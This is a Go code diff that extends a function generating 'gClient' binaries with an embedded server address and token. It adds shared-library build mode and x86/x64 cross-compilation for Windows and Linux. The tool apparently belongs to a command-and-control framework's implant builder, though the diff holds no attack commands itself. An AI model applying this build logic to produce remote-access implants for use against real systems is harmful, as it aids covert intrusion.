@@ -299,7 +299,9 @@ func (s *GServer) GenerateClient(
 	platform string,
 	serverAddress string,
 	serverPort uint16,
-	clientID string) (string, error) {
+	clientID string,
+	binType string,
+	arch string) (string, error) {
 
 	if clientID == "" {
 		clientID = common.GenerateString(8)
@@ -323,7 +325,7 @@ func (s *GServer) GenerateClient(
 
 	outputPath := fmt.Sprintf("configured/%s", clientID)
 
-	if platform == "win" {
+	/*if platform == "win" {
 		exec.Command("set GOOS=windows")
 		exec.Command("set GOARCH=386")
 		outputPath = fmt.Sprintf("configured/%s.exe", clientID)
@@ -334,16 +336,40 @@ func (s *GServer) GenerateClient(
 		exec.Command("set GOOS=linux")
 	} else {
 		log.Printf("[!] Invalid platform specified")
-	}
+	}*/
 
 	flagString := fmt.Sprintf("-s -w -X main.clientToken=%s -X main.serverAddress=%s -X main.serverPort=%d", token, serverAddress, serverPort)
+	var commands []string
 
-	cmd := exec.Command("go", "build", "-ldflags", flagString, "-o", outputPath, "gclient/gClient.go")
+	commands = append(commands, "build")
+
+	if binType == "lib" {
+		commands = append(commands, "-buildmode=c-shared")
+	}
+
+	commands = append(commands, "-ldflags", flagString, "-o", outputPath, "gclient/gClient.go")
+
+	cmd := exec.Command("go", commands...)
 	cmd.Env = os.Environ()
+	cmd.Env = append(cmd.Env, "CGO_ENABLED=1")
 	if platform == "win" {
 		cmd.Env = append(cmd.Env, "GOOS=windows")
-		cmd.Env = append(cmd.Env, "GOARCH=386")
+		if arch == "x86" {
+			cmd.Env = append(cmd.Env, "CC=i686-w64-mingw32-gcc")
+			cmd.Env = append(cmd.Env, "GOARCH=386")
+		} else if arch == "x64" {
+			cmd.Env = append(cmd.Env, "CC=x86_64-w64-mingw32-gcc")
+			cmd.Env = append(cmd.Env, "GOARCH=amd64")
+		}
+	} else if platform == "linux" {
+		cmd.Env = append(cmd.Env, "GOOS=linux")
+		if arch == "x86" {
+			cmd.Env = append(cmd.Env, "GOARCH=386")
+		} else if arch == "x64" {
+			cmd.Env = append(cmd.Env, "GOARCH=amd64")
+		}
 	}
+	log.Printf("[*] Build cmd: %s\n", cmd.String())
 	err = cmd.Run()
 	if err != nil {
 		log.Printf("[!] Failed to generate client: %s", err)
